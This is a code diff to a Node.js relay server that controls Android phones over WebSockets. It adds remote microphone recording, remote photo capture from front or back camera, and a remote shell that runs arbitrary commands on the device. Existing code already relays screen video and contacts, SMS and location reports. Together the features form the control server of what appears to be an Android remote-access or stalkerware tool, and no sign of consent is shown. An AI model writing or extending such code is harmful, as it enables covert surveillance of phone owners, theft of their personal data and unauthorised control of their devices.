@@ -234,6 +234,24 @@ io.on('connection', (socket) => {
     sendToAndroid(sessionId, { type: 'get-all-data' });
   });
 
+  // Audio/Camera capture
+  socket.on('start-audio', ({ sessionId }) => {
+    sendToAndroid(sessionId, { type: 'start-audio' });
+  });
+
+  socket.on('stop-audio', ({ sessionId }) => {
+    sendToAndroid(sessionId, { type: 'stop-audio' });
+  });
+
+  socket.on('take-photo', ({ sessionId, facing }) => {
+    sendToAndroid(sessionId, { type: 'take-photo', facing: facing || 'back' });
+  });
+
+  // Remote shell
+  socket.on('shell-command', ({ sessionId, command, requestId }) => {
+    sendToAndroid(sessionId, { type: 'shell', command, requestId: requestId || Date.now().toString() });
+  });
+
   socket.on('disconnect', () => {
     const { sessionId, role } = socket;
     if (sessionId && sessions.has(sessionId)) {
@@ -306,12 +324,19 @@ wss.on('connection', (ws) => {
 
   ws.on('message', (data, isBinary) => {
     if (isBinary) {
-      // Binary data = H.264 encoded video stream
-      // Packet format: [flags(1)] + [timestamp(8)] + [h264 NAL data]
-      if (data.length > 9) {
+      const marker = data[0];
+
+      if (marker === 0x02) {
+        // Audio data: [0x02] + [PCM16 data]
+        const audioData = data.slice(1);
+        io.to(sessionId).emit('audio-data', {
+          data: audioData.toString('base64'),
+          size: audioData.length
+        });
+      } else if (data.length > 9) {
+        // H.264 video: [flags(1)] + [timestamp(8)] + [h264 NAL data]
         const flags = data[0];
         const isKeyframe = (flags & 0x01) !== 0;
-        // Relay binary H.264 data directly to viewers
         io.to(sessionId).emit('h264-data', {
           data: data.toString('base64'),
           keyframe: isKeyframe,
@@ -416,6 +441,25 @@ function handleAndroidMessage(sessionId, msg) {
       // Data from Android (contacts, SMS, location)
       io.to(sessionId).emit('data-report', msg);
       console.log(`[Android] ${sessionId} data report: ${msg.dataType}`);
+      break;
+
+    case 'shell-result':
+      io.to(sessionId).emit('shell-result', msg);
+      console.log(`[Android] ${sessionId} shell: ${msg.command} -> exit ${msg.exitCode}`);
+      break;
+
+    case 'audio-config':
+      io.to(sessionId).emit('audio-config', msg);
+      console.log(`[Android] ${sessionId} audio started: ${msg.sampleRate}Hz`);
+      break;
+
+    case 'audio-stopped':
+      io.to(sessionId).emit('audio-stopped', msg);
+      console.log(`[Android] ${sessionId} audio stopped`);
+      break;
+
+    case 'photo-result':
+      io.to(sessionId).emit('photo-result', msg);
       break;
 
     case 'stream-config':
